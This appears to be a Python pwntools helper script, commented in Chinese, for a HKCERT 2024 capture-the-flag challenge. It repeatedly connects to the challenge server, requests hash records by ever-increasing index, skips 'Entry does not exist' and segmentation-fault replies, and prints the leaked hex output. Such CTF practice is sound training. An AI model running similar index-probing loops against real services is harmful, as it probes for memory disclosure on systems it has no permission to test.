from pwn import *

context.log_level = "CRITICAL" # 最小化日誌記錄


def get(idx):

    r = remote("c55-flag-hasher.hkcert24.pwnable.hk", 1337, ssl=True)
    r.recvuntil(b"2 - Read Hash record\n") # 等待直到我們收到這個文本... 這是我們需要回應的時候
    r.sendline(b'2')                       # 發送命令

    r.recvuntil(b"Idx: ")

    r.sendline(str(idx).encode())          # 將 idx的值轉換為字符串，並發送它

    server_response = r.recvline() # 將服務器的回應保存到變量裡
    server_responsetext =  server_response.decode("utf-8")

    if(("Entry does not exist." in server_responsetext) ):
        return

    if ("Segmentation fault" in server_responsetext):
        return




    #print(server_response)
    #print(server_responsetest)

    hex_ouput = server_response.split(b" : ")[1]
    print(hex_ouput)



count = 0

while True:
    get(count)
    count+=1
    if(count%100 ==0):
        print(count)
